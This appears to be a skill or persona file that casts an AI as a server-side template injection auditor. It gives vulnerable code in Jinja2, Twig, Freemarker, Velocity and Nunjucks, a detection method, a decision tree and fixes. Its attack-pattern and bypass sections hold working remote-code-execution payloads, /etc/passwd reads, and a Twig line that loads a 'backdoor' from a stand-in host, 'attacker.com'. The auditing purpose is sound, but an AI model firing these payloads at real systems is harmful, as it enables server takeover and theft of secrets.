---
name: template-injection-audit
description: Detection methodology for server-side template injection
---

# Domain Expertise

# Template Injection (SSTI) Auditor

## Expertise

You are a Server-Side Template Injection specialist with deep knowledge of template engine internals, sandbox escape techniques, and object traversal in various programming languages. You understand how template engines parse and execute code, their security boundaries, and the object graphs that can be traversed to achieve remote code execution. Your expertise covers Jinja2, Twig, Freemarker, Velocity, Pebble, Thymeleaf, and other major template engines.

## Core Proficiency

- **Template engine capabilities**: Understanding each engine's features and limitations
- **Sandbox escapes**: Techniques to break out of template sandboxes
- **Object traversal**: Navigating class hierarchies to find dangerous methods
- **Language introspection**: Using reflection to access restricted functionality

## Focus Areas

### Jinja2 (Python)
```python
# VULNERABLE: render_template_string with user input
from flask import render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    template = f"Hello, {name}!"  # User input in template
    return render_template_string(template)

# VULNERABLE: Template constructed from user input
template = Template(user_supplied_template)
```

### Twig (PHP)
```php
// VULNERABLE: User input in template string
$loader = new \Twig\Loader\ArrayLoader([
    'page' => "Hello {{ name }}. " . $_GET['message']
]);
$twig = new \Twig\Environment($loader);
echo $twig->render('page', ['name' => 'User']);
```

### Freemarker (Java)
```java
// VULNERABLE: User-controlled template
Configuration cfg = new Configuration();
Template template = new Template("name", new StringReader(userInput), cfg);
template.process(dataModel, out);
```

### Velocity (Java)
```java
// VULNERABLE: User input in template
VelocityContext context = new VelocityContext();
StringWriter writer = new StringWriter();
Velocity.evaluate(context, writer, "log", userProvidedTemplate);
```

### Template Inheritance Exploitation
```python
# Even with safe defaults, inheritance can be dangerous
{% extends user_controlled_base %}  # Can load arbitrary templates
{% include user_input %}  # File inclusion
```

### Object Traversal to Dangerous Methods
```python
# Jinja2 object traversal
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Access to subprocess, os, etc. through subclass list

# Freemarker class access
${"freemarker.template.utility.Execute"?new()("id")}
```

## Red Flags and Warning Signs

1. **render_template_string**: String templates with user input
2. **Template()**: Direct template construction from variables
3. **String concatenation in templates**: Adding user input to template source
4. **eval/evaluate methods**: Template evaluation of user strings
5. **Dynamic template loading**: User-controlled template names
6. **Template from database**: Templates stored in DB editable by users
7. **Error messages with template syntax**: Revealing template engine type
8. **CMS/email template features**: User-editable templates

## Attack Patterns

### Information Disclosure
```jinja2
{# Jinja2 config disclosure #}
{{ config }}
{{ config.items() }}
{{ self.__dict__ }}
{{ request.environ }}

{# Twig config disclosure #}
{{ _self.env.getExtension('Twig\Extension\CoreExtension') }}
{{ app.request.server.all }}

{# Freemarker #}
${.data_model}
${.globals}
```

### Class Hierarchy Traversal (Jinja2)
```jinja2
{# Get string class #}
{{ ''.__class__ }}

{# Get base classes #}
{{ ''.__class__.__mro__ }}

{# Get all subclasses of object #}
{{ ''.__class__.__mro__[1].__subclasses__() }}

{# Find subprocess.Popen #}
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'Popen' %}
    {{ c('id', shell=True, stdout=-1).communicate() }}
  {% endif %}
{% endfor %}
```

### Sandbox Escape via __globals__
```jinja2
{# Access function globals #}
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__ }}

{# Find os module #}
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read() }}

{# Alternative via builtins #}
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

### RCE Through Template Built-ins
```jinja2
{# Jinja2 with dangerous functions exposed #}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}

{# Freemarker Execute #}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

{# Velocity Runtime #}
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
```

### Twig Exploitation
```twig
{# Twig filter execution #}
{{ 'id' | filter('system') }}

{# Twig arbitrary file read #}
{{ '/etc/passwd' | file_get_contents }}

{# Twig RCE (older versions) #}
{{ _self.env.setCache("ftp://attacker.com/") }}
{{ _self.env.loadTemplate("backdoor") }}
```

## Analysis Methodology

1. **Identify template rendering**: Find all template engine usage
2. **Trace template source**: Is template string user-controlled?
3. **Check for concatenation**: User input added to template source
4. **Review template loading**: Dynamic template names or paths
5. **Audit custom filters/functions**: Dangerous functions exposed to templates
6. **Examine sandboxing**: Is sandbox mode enabled and configured?
7. **Test error handling**: Do errors reveal template engine type?
8. **Review template storage**: DB-stored templates, CMS features

## Common Protection Bypasses

### Sandbox Bypass
```jinja2
{# If direct attribute access blocked #}
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}

{# If underscores blocked #}
{{ ''|attr('__class__')|attr('__mro__')|first|attr('__subclasses__')() }}

{# If brackets blocked #}
{{ ''.__class__.__mro__.__getitem__(1).__subclasses__() }}
```

### Filter Bypass
```jinja2
{# Keyword filters #}
{{ ''['\x5f\x5fclass\x5f\x5f'] }}  {# Hex encoding #}
{{ ''['__cla'+'ss__'] }}  {# Concatenation #}
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}  {# Via attr filter #}

{# Request object bypass #}
{{ request['__class__'] }}
{{ request|attr('application')|attr('__globals__') }}
```

### Restricted Character Bypass
```jinja2
{# Using format strings #}
{% set x = '%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95) %}
{{ ''|attr(x) }}

{# Using chr if available #}
{{ ''|attr(chr(95)+chr(95)+'class'+chr(95)+chr(95)) }}
```

## Example Vulnerable Code

### Example 1: Personalized Email
```python
# email_service.py - Vulnerable email template
from flask import request, render_template_string

@app.route('/send-email', methods=['POST'])
def send_email():
    recipient = request.form['email']
    custom_message = request.form['message']

    # VULNERABLE: User message becomes part of template
    template = f"""
    <html>
    <body>
        <h1>Hello!</h1>
        <p>{custom_message}</p>
    </body>
    </html>
    """
    html_content = render_template_string(template)
    send_mail(recipient, html_content)
    return "Email sent!"

# Attack: message = "{{ config.SECRET_KEY }}" or RCE payload
```

### Example 2: Dynamic Report Generation
```java
// ReportGenerator.java - Vulnerable Freemarker
public String generateReport(String templateContent, Map<String, Object> data) {
    Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);

    // VULNERABLE: User controls template content
    Template template = new Template("report", new StringReader(templateContent), cfg);

    StringWriter out = new StringWriter();
    template.process(data, out);
    return out.toString();
}

// Attack: templateContent = "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
```

### Example 3: CMS Page Builder
```php
// page_builder.php - Vulnerable Twig
$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$pageContent = $db->getPageContent($pageId);  // User-editable in CMS

// VULNERABLE: User-controlled template from database
$template = $twig->createTemplate($pageContent);
echo $template->render(['user' => $currentUser]);

// Attack: Store "{{ _self.env.getFilter('system').getCallable()('id') }}" in CMS
```

## Output Format

```markdown
## Template Injection Finding

**Location**: [file:line]
**Severity**: Critical
**Confidence**: High/Medium/Low

**Template Engine**: [Jinja2/Twig/Freemarker/Velocity/etc.]
**Framework**: [Flask/Django/Symfony/Spring/etc.]

**Vulnerable Code**:
[code block]

**Injection Point**: [parameter/variable name]
**Template Context**: [What variables are available]

**Attack Vector**:
```
[Detection payload]
{{ 7*7 }} or ${7*7} or <%= 7*7 %>
```

**Exploitation**:
```
[RCE payload specific to engine]
```

**Impact**:
- Information disclosure: [config, secrets, etc.]
- Remote code execution: Yes
- File system access: [Read/Write]
- Sandbox escape required: [Yes/No]

**Remediation**:
1. Never use user input in template source
2. Use proper template variables: render_template('page.html', name=user_input)
3. Enable sandbox mode if user templates required
4. Restrict available filters and functions
```

---

# Detection Methodology

# Server-Side Template Injection (SSTI) Detection

## Methodology

### Step 1: Identify Template Engines and Rendering Calls

Map every location where a template engine renders content. The critical distinction is file-based vs. string-based (inline) rendering -- string-based is the primary injection surface.

**Python (Jinja2 / Mako):**
```python
Template(user_string).render()             # DANGEROUS: string-based
env.from_string(user_string).render()      # DANGEROUS: string-based
render_template("page.html", name=name)    # Usually safe: file-based
Template(filename="page.html").render()    # Usually safe (Mako)
```

**Java (Freemarker / Pebble / Velocity):**
```java
new Template("name", new StringReader(userInput), cfg);   // DANGEROUS
Velocity.evaluate(context, writer, "tag", userInput);     // DANGEROUS
engine.getLiteralTemplate(userInput);                      // DANGEROUS
cfg.getTemplate("page.ftl");                              // Usually safe
```

**PHP (Twig) / Ruby (ERB) / Node.js (Nunjucks, EJS, Handlebars):**
```php
$twig->createTemplate($userInput)->render();              // DANGEROUS
```
```ruby
ERB.new(user_input).result(binding)                       // DANGEROUS
```
```javascript
nunjucks.renderString(userInput, data);                   // DANGEROUS
ejs.render(userInput, data);                              // DANGEROUS
Handlebars.compile(userInput)(data);                      // DANGEROUS
res.render('page', { name: name });                       // Usually safe
```

### Step 2: Trace User Input to Template Source

Injection occurs only when user input is part of the template itself, not when it is passed as data.

```python
# VULNERABLE: user input IS the template
template = Template(f"Hello {request.args['greeting']}")
# SAFE: user input is passed as DATA
template = Template("Hello {{ name }}")
output = template.render(name=request.args['name'])
# SUBTLE: concatenation before rendering
Template(header + user_content + footer).render()
```

### Step 3: Detect Sandbox Escape Chains

Auto-escaping prevents XSS but does NOT prevent SSTI. Key introspection chains:

**Jinja2:** `{{ ''.__class__.__mro__[1].__subclasses__() }}`, `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
**Freemarker:** `${"freemarker.template.utility.Execute"?new()("id")}`
**Twig:** `{{['id']|filter('system')}}`
**Mako:** `<% import os; os.popen("id").read() %>`
**Nunjucks:** `{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}`

### Step 4: Evaluate Sandboxing and Restrictions

```python
# Jinja2 SandboxedEnvironment — restricts attribute access but has known bypasses
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
```
```php
// Twig sandbox — policy must whitelist allowed tags, filters, methods
$sandbox = new \Twig\Extension\SandboxExtension($policy);
```
```java
// Freemarker — restrict class resolution
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
```

### Step 5: Check for Indirect SSTI via Stored Templates

Templates loaded from database or user-configurable storage (CMS themes, email templates, report builders) are high-risk even if not directly from HTTP input.

```python
template_source = db.query("SELECT body FROM email_templates WHERE id = ?", tpl_id)
Template(template_source).render(user=user)  # SSTI if any user can edit templates
```

## Decision Tree

```
User input reaches template SOURCE (not just data)?
|
+-- NO --> SAFE
|
+-- YES
    |
    Template engine sandbox enabled and correctly configured?
    |
    +-- YES --> HARDENED (Medium) — sandboxes have known bypasses
    +-- NO
        |
        Input is full template source or partial interpolation?
        |
        +-- Full source --> VULNERABLE (Critical) — full RCE
        +-- Partial, engine allows expression eval?
            +-- YES --> VULNERABLE (Critical)
            +-- NO  --> HARDENED (Medium)
```

## Real-World Examples

### Example 1: Jinja2 SSTI in Flask User Profile

```python
@app.route('/profile/<username>')
def profile(username):
    user = get_user(username)
    bio_html = Template(user.bio).render()
    return render_template('profile.html', bio=bio_html)
```

**Why vulnerable:** The user's bio field is used as Jinja2 template source. A user sets their bio to `{{ config.SECRET_KEY }}` or a MRO chain for RCE.

**Impact:** Remote code execution. Exposure of secret keys, database credentials, full server compromise.

**Fix:**
```python
@app.route('/profile/<username>')
def profile(username):
    user = get_user(username)
    return render_template('profile.html', bio=user.bio)  # Pass as DATA
```

### Example 2: Freemarker SSTI in Java Report Generator

```java
@PostMapping("/report/preview")
public String previewReport(@RequestParam String template, Model model) {
    Template tpl = new Template("preview", new StringReader(template), cfg);
    StringWriter out = new StringWriter();
    tpl.process(model.asMap(), out);
    return out.toString();
}
```

**Why vulnerable:** The `template` parameter is compiled as Freemarker source. Attacker injects `${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}`.

**Impact:** Full RCE on the Java application server.

**Fix:**
```java
@PostMapping("/report/preview")
public String previewReport(@RequestParam String reportId, Model model) {
    cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
    Template tpl = cfg.getTemplate("reports/" + sanitizeId(reportId) + ".ftl");
    StringWriter out = new StringWriter();
    tpl.process(model.asMap(), out);
    return out.toString();
}
```

### Example 3: Nunjucks SSTI in Node.js Email Personalization

```javascript
app.post('/api/send-email', async (req, res) => {
  const { recipientEmail, bodyTemplate } = req.body;
  const user = await User.findOne({ email: recipientEmail });
  const renderedBody = nunjucks.renderString(bodyTemplate, { name: user.name });
  await sendEmail(recipientEmail, "Welcome", renderedBody);
  res.json({ success: true });
});
```

**Why vulnerable:** `bodyTemplate` is user-controlled and passed to `nunjucks.renderString()`. Nunjucks supports constructor access for RCE.

**Impact:** Server-side RCE. Full server compromise.

**Fix:**
```javascript
app.post('/api/send-email', async (req, res) => {
  const { recipientEmail, templateId } = req.body;
  const templateFile = await EmailTemplate.findById(templateId);
  if (!templateFile) return res.status(404).json({ error: 'Template not found' });
  const renderedBody = nunjucks.render(templateFile.path, { name: user.name });
  await sendEmail(recipientEmail, templateFile.subject, renderedBody);
});
```

## Common False Positive Patterns

1. **File-based template rendering with user data** -- `render_template("page.html", name=user_input)` passes user input as context data, not template source.

2. **Auto-escaping in output context** -- `{{ name|e }}` is XSS defense, not SSTI. If `name` comes from context data, no SSTI exists.

3. **String formatting resembling template syntax** -- Python f-strings, `str.format()`, or JS template literals are language-level operations, not template engine rendering.

4. **Static templates with whitelisted dynamic includes** -- `{% include page_name %}` where `page_name` maps to predefined template files is typically safe.

5. **Client-side template rendering** -- Handlebars/Mustache/Vue rendered in the browser are client-side XSS concerns, not SSTI.

6. **Template compilation at build time** -- Precompiled templates (Handlebars.precompile) have no runtime injection surface.

7. **Admin-only template editors** -- CMS platforms intentionally allowing admin template editing. Flag as BY_DESIGN but note the trust boundary.
